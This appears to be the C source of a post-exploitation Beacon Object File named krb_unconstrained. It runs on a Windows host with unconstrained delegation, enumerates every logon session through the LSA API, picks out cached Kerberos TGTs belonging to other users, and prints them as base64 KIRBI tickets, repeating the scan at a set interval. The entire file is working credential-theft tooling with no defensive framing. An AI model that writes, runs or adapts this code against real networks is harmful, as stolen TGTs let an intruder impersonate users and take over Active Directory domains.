/*
 * krb_unconstrained - Monitor for TGTs on unconstrained delegation hosts
 *
 * On hosts with unconstrained delegation, incoming authentications may
 * include the client's TGT. This tool monitors for and extracts these tickets.
 *
 * Usage: krb_unconstrained [/interval:SECONDS] [/count:NUM] [/targetuser:USER]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Convert UNICODE_STRING to char* */
static char* unicode_to_char(UNICODE_STRING* ustr) {
    if (!ustr->Buffer || ustr->Length == 0) return NULL;
    int len = ustr->Length / sizeof(WCHAR);
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    MSVCRT$wcstombs(result, ustr->Buffer, len);
    result[len] = '\0';
    return result;
}

/* Track seen tickets to avoid duplicates */
typedef struct _SEEN_TICKET {
    char serverName[256];
    char clientName[256];
    LARGE_INTEGER endTime;
} SEEN_TICKET;

static SEEN_TICKET g_seenTickets[100];
static int g_seenCount = 0;

static int is_ticket_seen(const char* server, const char* client, LARGE_INTEGER endTime) {
    for (int i = 0; i < g_seenCount; i++) {
        if (strcmp(g_seenTickets[i].serverName, server) == 0 &&
            strcmp(g_seenTickets[i].clientName, client) == 0 &&
            g_seenTickets[i].endTime.QuadPart == endTime.QuadPart) {
            return 1;
        }
    }
    return 0;
}

static void mark_ticket_seen(const char* server, const char* client, LARGE_INTEGER endTime) {
    if (g_seenCount >= 100) {
        /* Shift out oldest */
        memmove(&g_seenTickets[0], &g_seenTickets[1], sizeof(SEEN_TICKET) * 99);
        g_seenCount = 99;
    }
    strncpy(g_seenTickets[g_seenCount].serverName, server, 255);
    strncpy(g_seenTickets[g_seenCount].clientName, client, 255);
    g_seenTickets[g_seenCount].endTime = endTime;
    g_seenCount++;
}

/* Check if ticket is a TGT (krbtgt service) */
static int is_tgt(const char* serverName) {
    return (strstr(serverName, "krbtgt") != NULL);
}

/* Export ticket in base64 */
static void export_ticket_b64(HANDLE hLsa, ULONG authPackage, PLUID luid,
                               UNICODE_STRING* serverName, formatp* output) {
    NTSTATUS status, subStatus;
    KERB_RETRIEVE_TKT_REQUEST* request = NULL;
    PKERB_RETRIEVE_TKT_RESPONSE response = NULL;
    ULONG requestSize, responseSize = 0;

    requestSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + serverName->MaximumLength;
    request = (KERB_RETRIEVE_TKT_REQUEST*)malloc(requestSize);
    if (!request) return;

    memset(request, 0, requestSize);
    request->MessageType = KerbRetrieveEncodedTicketMessage;
    request->LogonId = *luid;
    request->TicketFlags = 0;
    request->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    request->EncryptionType = 0;

    request->TargetName.Length = serverName->Length;
    request->TargetName.MaximumLength = serverName->MaximumLength;
    request->TargetName.Buffer = (PWSTR)((BYTE*)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    memcpy(request->TargetName.Buffer, serverName->Buffer, serverName->Length);

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, authPackage, request, requestSize,
        (PVOID*)&response, &responseSize, &subStatus);

    if (status == 0 && response && response->Ticket.EncodedTicketSize > 0) {
        char* b64 = b64_encode_alloc(response->Ticket.EncodedTicket,
                                   response->Ticket.EncodedTicketSize);
        if (b64) {
            BeaconFormatPrintf(output, "  [KIRBI]\n");
            size_t b64len = strlen(b64);
            for (size_t i = 0; i < b64len; i += 76) {
                BeaconFormatPrintf(output, "    %.76s\n", b64 + i);
            }
            free(b64);
        }
    }

    if (response) SECUR32$LsaFreeReturnBuffer(response);
    free(request);
}

/* Scan all sessions for TGTs */
static int scan_for_tgts(HANDLE hLsa, ULONG authPackage, const char* targetUser,
                          int exportTickets, formatp* output) {
    NTSTATUS status;
    ULONG sessionCount = 0;
    PLUID sessions = NULL;
    int tgtCount = 0;

    status = SECUR32$LsaEnumerateLogonSessions(&sessionCount, &sessions);
    if (status != 0) {
        BeaconFormatPrintf(output, "[-] Failed to enumerate sessions: 0x%08X\n", status);
        return 0;
    }

    for (ULONG i = 0; i < sessionCount; i++) {
        PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
        KERB_QUERY_TKT_CACHE_REQUEST request;
        PKERB_QUERY_TKT_CACHE_RESPONSE response = NULL;
        ULONG responseSize = 0;
        NTSTATUS subStatus;

        status = SECUR32$LsaGetLogonSessionData(&sessions[i], &sessionData);
        if (status != 0 || !sessionData) continue;

        char* userName = unicode_to_char(&sessionData->UserName);
        char* domain = unicode_to_char(&sessionData->LogonDomain);

        /* Filter by target user if specified */
        if (targetUser && userName) {
            if (strstr(userName, targetUser) == NULL) {
                if (userName) free(userName);
                if (domain) free(domain);
                SECUR32$LsaFreeReturnBuffer(sessionData);
                continue;
            }
        }

        /* Query tickets for this session */
        memset(&request, 0, sizeof(request));
        request.MessageType = KerbQueryTicketCacheMessage;
        request.LogonId = sessions[i];

        status = SECUR32$LsaCallAuthenticationPackage(
            hLsa, authPackage, &request, sizeof(request),
            (PVOID*)&response, &responseSize, &subStatus);

        if (status == 0 && response) {
            for (ULONG j = 0; j < response->CountOfTickets; j++) {
                char* serverName = unicode_to_char(&response->Tickets[j].ServerName);
                if (!serverName) continue;

                /* Check if it's a TGT */
                if (is_tgt(serverName)) {
                    char* clientName = userName ? userName : "(unknown)";

                    /* Check if we've seen this ticket before */
                    if (!is_ticket_seen(serverName, clientName, response->Tickets[j].EndTime)) {
                        char endTime[32];
                        FILETIME ft;
                        SYSTEMTIME st;
                        ft.dwLowDateTime = response->Tickets[j].EndTime.LowPart;
                        ft.dwHighDateTime = response->Tickets[j].EndTime.HighPart;
                        if (KERNEL32$FileTimeToSystemTime(&ft, &st)) {
                            sprintf(endTime, "%04d-%02d-%02d %02d:%02d:%02d",
                                st.wYear, st.wMonth, st.wDay,
                                st.wHour, st.wMinute, st.wSecond);
                        } else {
                            strcpy(endTime, "N/A");
                        }

                        BeaconFormatPrintf(output, "\n[+] TGT Found!\n");
                        BeaconFormatPrintf(output, "  User      : %s\\%s\n",
                            domain ? domain : "?", userName ? userName : "?");
                        BeaconFormatPrintf(output, "  Service   : %s\n", serverName);
                        BeaconFormatPrintf(output, "  EndTime   : %s\n", endTime);
                        BeaconFormatPrintf(output, "  LUID      : 0x%X:0x%X\n",
                            sessions[i].HighPart, sessions[i].LowPart);

                        if (exportTickets) {
                            export_ticket_b64(hLsa, authPackage, &sessions[i],
                                &response->Tickets[j].ServerName, output);
                        }

                        mark_ticket_seen(serverName, clientName, response->Tickets[j].EndTime);
                        tgtCount++;
                    }
                }
                free(serverName);
            }
            SECUR32$LsaFreeReturnBuffer(response);
        }

        if (userName) free(userName);
        if (domain) free(domain);
        SECUR32$LsaFreeReturnBuffer(sessionData);
    }

    SECUR32$LsaFreeReturnBuffer(sessions);
    return tgtCount;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* interval_str = NULL;
    char* count_str = NULL;
    char* targetUser = NULL;
    char* noexport = NULL;
    HANDLE hLsa = NULL;
    ULONG authPackage = 0;
    NTSTATUS status;
    LSA_STRING kerbName;
    int interval = 5;  /* Default 5 second interval */
    int maxCount = 1;  /* Default single scan */
    int exportTickets = 1;
    int totalTgts = 0;

    BeaconFormatAlloc(&output, 65536);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Unconstrained Delegation TGT Monitor\n\n");


    interval_str = arg_get(&parser, "interval");
    count_str = arg_get(&parser, "count");
    targetUser = arg_get(&parser, "targetuser");
    noexport = arg_get(&parser, "noexport");

    if (interval_str) {
        interval = atoi(interval_str);
        if (interval < 1) interval = 1;
        if (interval > 300) interval = 300;
    }

    if (count_str) {
        maxCount = atoi(count_str);
        if (maxCount < 1) maxCount = 1;
        if (maxCount > 100) maxCount = 100;
    }

    if (noexport) {
        exportTickets = 0;
    }

    BeaconFormatPrintf(&output, "[*] Interval: %d seconds\n", interval);
    BeaconFormatPrintf(&output, "[*] Scan count: %d\n", maxCount);
    if (targetUser) {
        BeaconFormatPrintf(&output, "[*] Target user filter: %s\n", targetUser);
    }
    BeaconFormatPrintf(&output, "[*] Export tickets: %s\n", exportTickets ? "Yes" : "No");
    BeaconFormatPrintf(&output, "\n[*] Note: This host must have unconstrained delegation enabled\n");
    BeaconFormatPrintf(&output, "[*] Note: Requires elevation to see other users' sessions\n\n");


    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to LSA: 0x%08X\n", status);
        goto cleanup;
    }


    kerbName.Buffer = "kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to find Kerberos package: 0x%08X\n", status);
        goto cleanup;
    }

    /* Reset seen tickets */
    g_seenCount = 0;

    /* Perform scans */
    for (int scan = 0; scan < maxCount; scan++) {
        BeaconFormatPrintf(&output, "[*] Scan %d/%d at ", scan + 1, maxCount);

        /* Get current time */
        SYSTEMTIME st;
        KERNEL32$GetLocalTime(&st);
        BeaconFormatPrintf(&output, "%02d:%02d:%02d\n",
            st.wHour, st.wMinute, st.wSecond);

        int found = scan_for_tgts(hLsa, authPackage, targetUser, exportTickets, &output);
        totalTgts += found;

        if (found == 0) {
            BeaconFormatPrintf(&output, "  (No new TGTs found)\n");
        }

        /* Sleep between scans (except for last scan) */
        if (scan < maxCount - 1) {
            KERNEL32$Sleep(interval * 1000);
        }
    }

    BeaconFormatPrintf(&output, "\n========================================\n");
    BeaconFormatPrintf(&output, "[*] Monitoring complete\n");
    BeaconFormatPrintf(&output, "[*] Total TGTs captured: %d\n", totalTgts);

cleanup:
    if (hLsa) SECUR32$LsaDeregisterLogonProcess(hLsa);
    if (interval_str) free(interval_str);
    if (count_str) free(count_str);
    if (targetUser) free(targetUser);
    if (noexport) free(noexport);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
